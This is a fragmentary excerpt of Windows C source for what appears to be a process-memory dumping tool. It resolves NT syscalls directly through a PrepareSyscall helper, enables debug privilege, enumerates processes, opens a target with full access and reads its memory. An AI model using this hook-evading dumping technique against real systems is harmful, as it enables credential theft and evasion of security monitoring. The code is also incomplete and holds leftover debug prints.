...
BOOL fetch_process_info(struct dump_context* dc)
{
	...
	for (;;)
	{
		NtQuerySystemInformation_t querysysteminfo = (NtQuerySystemInformation_t)PrepareSyscall((char*)"NtQuerySystemInformation");
		nts = querysysteminfo(SystemProcessInformation, pcs_buffer, buf_size, NULL);
		if (nts != 0xC0000004L)
			break;
...
{
	SIZE_T read = 0;
	NtReadVirtualMemory_t pNtReadMemory = (NtReadVirtualMemory_t)PrepareSyscall((char*)"NtReadVirtualMemory");
	NTSTATUS res = pNtReadMemory(process, (PVOID*)addr, buf, size, &read);
	return !res;
}
...
BOOL pe_load_nt_header(HANDLE hProc, DWORD64 base, IMAGE_NT_HEADERS* nth)
{
	...
	NTSTATUS res = pNtReadMemory(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);
	NTSTATUS res2 = pNtReadMemory(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);
...
void EnableDebugPriv()
{
	...
	printf("Here");
	NtOpenProcessToken_t pNtOpenProcessToken = (NtOpenProcessToken_t)PrepareSyscall((char*)"NtOpenProcessToken");
	printf("here2");
	NTSTATUS status = pNtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
	printf("here3");
	...
	NtAdjustPrivilegesToken_t pNtAdjustPrivileges = (NtAdjustPrivilegesToken_t)PrepareSyscall((char*)"NtAdjustPrivilegesToken");

	status = pNtAdjustPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (status != STATUS_SUCCESS)
...
int main(int argc, char* argv[])
{
	...
	status = pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object, &clientID);
